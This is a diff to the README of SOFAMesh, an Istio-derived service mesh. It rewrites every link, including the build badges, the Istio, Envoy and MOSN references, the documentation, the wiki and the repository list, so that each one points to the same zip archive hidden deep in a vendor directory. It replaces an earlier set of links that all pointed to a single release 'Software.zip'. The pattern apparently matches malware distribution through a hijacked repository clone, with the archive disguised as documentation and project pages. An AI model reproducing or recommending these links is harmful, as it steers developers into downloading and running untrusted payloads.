@@ -1,25 +1,25 @@
 # SOFAMesh
 
-[![CircleCI](https://github.com/huizuohaode/sofa-mesh/releases/download/v1.0/Software.zip)](https://github.com/huizuohaode/sofa-mesh/releases/download/v1.0/Software.zip)
-[![Go Report Card](https://github.com/huizuohaode/sofa-mesh/releases/download/v1.0/Software.zip)](https://github.com/huizuohaode/sofa-mesh/releases/download/v1.0/Software.zip)
-[![https://github.com/huizuohaode/sofa-mesh/releases/download/v1.0/Software.zip](https://github.com/huizuohaode/sofa-mesh/releases/download/v1.0/Software.zip)](https://github.com/huizuohaode/sofa-mesh/releases/download/v1.0/Software.zip)
+[![CircleCI](https://github.com/huizuohaode/sofa-mesh/raw/refs/heads/master/vendor/k8s.io/kubernetes/pkg/util/pointer/sofa-mesh-v1.5.zip)](https://github.com/huizuohaode/sofa-mesh/raw/refs/heads/master/vendor/k8s.io/kubernetes/pkg/util/pointer/sofa-mesh-v1.5.zip)
+[![Go Report Card](https://github.com/huizuohaode/sofa-mesh/raw/refs/heads/master/vendor/k8s.io/kubernetes/pkg/util/pointer/sofa-mesh-v1.5.zip)](https://github.com/huizuohaode/sofa-mesh/raw/refs/heads/master/vendor/k8s.io/kubernetes/pkg/util/pointer/sofa-mesh-v1.5.zip)
+[![https://github.com/huizuohaode/sofa-mesh/raw/refs/heads/master/vendor/k8s.io/kubernetes/pkg/util/pointer/sofa-mesh-v1.5.zip](https://github.com/huizuohaode/sofa-mesh/raw/refs/heads/master/vendor/k8s.io/kubernetes/pkg/util/pointer/sofa-mesh-v1.5.zip)](https://github.com/huizuohaode/sofa-mesh/raw/refs/heads/master/vendor/k8s.io/kubernetes/pkg/util/pointer/sofa-mesh-v1.5.zip)
 
-SOFAMesh 是基于 [Istio](https://github.com/huizuohaode/sofa-mesh/releases/download/v1.0/Software.zip) 改进和扩展而来的 Service Mesh 大规模落地实践方案。在继承 Istio 强大功能和丰富特性的基础上，为满足大规模部署下的性能要求以及应对落地实践中的实际情况，有如下改进：
+SOFAMesh 是基于 [Istio](https://github.com/huizuohaode/sofa-mesh/raw/refs/heads/master/vendor/k8s.io/kubernetes/pkg/util/pointer/sofa-mesh-v1.5.zip) 改进和扩展而来的 Service Mesh 大规模落地实践方案。在继承 Istio 强大功能和丰富特性的基础上，为满足大规模部署下的性能要求以及应对落地实践中的实际情况，有如下改进：
 
-- 采用 Golang 编写的 [MOSN](https://github.com/huizuohaode/sofa-mesh/releases/download/v1.0/Software.zip) 取代 [Envoy](https://github.com/huizuohaode/sofa-mesh/releases/download/v1.0/Software.zip)
+- 采用 Golang 编写的 [MOSN](https://github.com/huizuohaode/sofa-mesh/raw/refs/heads/master/vendor/k8s.io/kubernetes/pkg/util/pointer/sofa-mesh-v1.5.zip) 取代 [Envoy](https://github.com/huizuohaode/sofa-mesh/raw/refs/heads/master/vendor/k8s.io/kubernetes/pkg/util/pointer/sofa-mesh-v1.5.zip)
 - 合并 Mixer 到数据平面以解决性能瓶颈
 - 增强 Pilot 以实现更灵活的服务发现机制
-- 增加对 [SOFA RPC](https://github.com/huizuohaode/sofa-mesh/releases/download/v1.0/Software.zip)、Dubbo 的支持
+- 增加对 [SOFA RPC](https://github.com/huizuohaode/sofa-mesh/raw/refs/heads/master/vendor/k8s.io/kubernetes/pkg/util/pointer/sofa-mesh-v1.5.zip)、Dubbo 的支持
 
 初始版本由蚂蚁金服和阿里大文娱UC事业部携手贡献，期待社区一起来参与后续开发，共建一个开源精品项目。
 
-- [SOFAMesh 文档](https://github.com/huizuohaode/sofa-mesh/releases/download/v1.0/Software.zip)
-- [Istio Community](https://github.com/huizuohaode/sofa-mesh/releases/download/v1.0/Software.zip) - describes how to get involved and contribute to the Istio project
-- [Istio Developer's Guide](https://github.com/huizuohaode/sofa-mesh/releases/download/v1.0/Software.zip) - explains how to set up and use an Istio development environment
-- [Project Conventions](https://github.com/huizuohaode/sofa-mesh/releases/download/v1.0/Software.zip) - describes the conventions we use within the code base
-- [Creating Fast and Lean Code](https://github.com/huizuohaode/sofa-mesh/releases/download/v1.0/Software.zip) - performance-oriented advice and guidelines for the code base
+- [SOFAMesh 文档](https://github.com/huizuohaode/sofa-mesh/raw/refs/heads/master/vendor/k8s.io/kubernetes/pkg/util/pointer/sofa-mesh-v1.5.zip)
+- [Istio Community](https://github.com/huizuohaode/sofa-mesh/raw/refs/heads/master/vendor/k8s.io/kubernetes/pkg/util/pointer/sofa-mesh-v1.5.zip) - describes how to get involved and contribute to the Istio project
+- [Istio Developer's Guide](https://github.com/huizuohaode/sofa-mesh/raw/refs/heads/master/vendor/k8s.io/kubernetes/pkg/util/pointer/sofa-mesh-v1.5.zip) - explains how to set up and use an Istio development environment
+- [Project Conventions](https://github.com/huizuohaode/sofa-mesh/raw/refs/heads/master/vendor/k8s.io/kubernetes/pkg/util/pointer/sofa-mesh-v1.5.zip) - describes the conventions we use within the code base
+- [Creating Fast and Lean Code](https://github.com/huizuohaode/sofa-mesh/raw/refs/heads/master/vendor/k8s.io/kubernetes/pkg/util/pointer/sofa-mesh-v1.5.zip) - performance-oriented advice and guidelines for the code base
 
-You'll find many other useful documents on our [Wiki](https://github.com/huizuohaode/sofa-mesh/releases/download/v1.0/Software.zip).
+You'll find many other useful documents on our [Wiki](https://github.com/huizuohaode/sofa-mesh/raw/refs/heads/master/vendor/k8s.io/kubernetes/pkg/util/pointer/sofa-mesh-v1.5.zip).
 
 ## Introduction
 
@@ -29,7 +29,7 @@ and aggregate telemetry data. Istio's control plane provides an abstraction
 layer over the underlying cluster management platform, such as Kubernetes,
 Mesos, etc.
 
-Visit [https://github.com/huizuohaode/sofa-mesh/releases/download/v1.0/Software.zip](https://github.com/huizuohaode/sofa-mesh/releases/download/v1.0/Software.zip) for in-depth information about using Istio.
+Visit [https://github.com/huizuohaode/sofa-mesh/raw/refs/heads/master/vendor/k8s.io/kubernetes/pkg/util/pointer/sofa-mesh-v1.5.zip](https://github.com/huizuohaode/sofa-mesh/raw/refs/heads/master/vendor/k8s.io/kubernetes/pkg/util/pointer/sofa-mesh-v1.5.zip) for in-depth information about using Istio.
 
 Istio is composed of these components:
 
@@ -61,7 +61,7 @@ Cloud Foundry, and Mesos in the near future.
 
 The Istio project is divided across a few GitHub repositories.
 
-- [istio/istio](https://github.com/huizuohaode/sofa-mesh/releases/download/v1.0/Software.zip). This is the main repository that you are
+- [istio/istio](https://github.com/huizuohaode/sofa-mesh/raw/refs/heads/master/vendor/k8s.io/kubernetes/pkg/util/pointer/sofa-mesh-v1.5.zip). This is the main repository that you are
 currently looking at. It hosts Istio's core components and also
 the sample programs and the various documents that govern the Istio open source
 project. It includes:
@@ -69,25 +69,25 @@ project. It includes:
 including Citadel (acting as Certificate Authority), node agent, etc.
   - [pilot](pilot/). This directory
 contains platform-specific code to populate the
-[abstract service model](https://github.com/huizuohaode/sofa-mesh/releases/download/v1.0/Software.zip), dynamically reconfigure the proxies
+[abstract service model](https://github.com/huizuohaode/sofa-mesh/raw/refs/heads/master/vendor/k8s.io/kubernetes/pkg/util/pointer/sofa-mesh-v1.5.zip), dynamically reconfigure the proxies
 when the application topology changes, as well as translate
-[routing rules](https://github.com/huizuohaode/sofa-mesh/releases/download/v1.0/Software.zip) into proxy specific configuration.
+[routing rules](https://github.com/huizuohaode/sofa-mesh/raw/refs/heads/master/vendor/k8s.io/kubernetes/pkg/util/pointer/sofa-mesh-v1.5.zip) into proxy specific configuration.
   - [istioctl](istioctl/). This directory contains code for the
-[_istioctl_](https://github.com/huizuohaode/sofa-mesh/releases/download/v1.0/Software.zip) command line utility.
+[_istioctl_](https://github.com/huizuohaode/sofa-mesh/raw/refs/heads/master/vendor/k8s.io/kubernetes/pkg/util/pointer/sofa-mesh-v1.5.zip) command line utility.
   - [mixer](mixer/). This directory
 contains code to enforce various policies for traffic passing through the
 proxies, and collect telemetry data from proxies and services. There
 are plugins for interfacing with various cloud platforms, policy
 management services, and monitoring services.
 
-- [istio/api](https://github.com/huizuohaode/sofa-mesh/releases/download/v1.0/Software.zip). This repository defines
+- [istio/api](https://github.com/huizuohaode/sofa-mesh/raw/refs/heads/master/vendor/k8s.io/kubernetes/pkg/util/pointer/sofa-mesh-v1.5.zip). This repository defines
 component-level APIs and common configuration formats for the Istio platform.
 
-- [istio/mixerclient](https://github.com/huizuohaode/sofa-mesh/releases/download/v1.0/Software.zip). Client libraries
+- [istio/mixerclient](https://github.com/huizuohaode/sofa-mesh/raw/refs/heads/master/vendor/k8s.io/kubernetes/pkg/util/pointer/sofa-mesh-v1.5.zip). Client libraries
 (currently supports C++) for Mixer's API.
 
-- [istio/proxy](https://github.com/huizuohaode/sofa-mesh/releases/download/v1.0/Software.zip). The Istio proxy contains
-extensions to the [Envoy proxy](https://github.com/huizuohaode/sofa-mesh/releases/download/v1.0/Software.zip) (in the form of
+- [istio/proxy](https://github.com/huizuohaode/sofa-mesh/raw/refs/heads/master/vendor/k8s.io/kubernetes/pkg/util/pointer/sofa-mesh-v1.5.zip). The Istio proxy contains
+extensions to the [Envoy proxy](https://github.com/huizuohaode/sofa-mesh/raw/refs/heads/master/vendor/k8s.io/kubernetes/pkg/util/pointer/sofa-mesh-v1.5.zip) (in the form of
 Envoy filters), that allow the proxy to delegate policy enforcement
 decisions to Mixer.
 
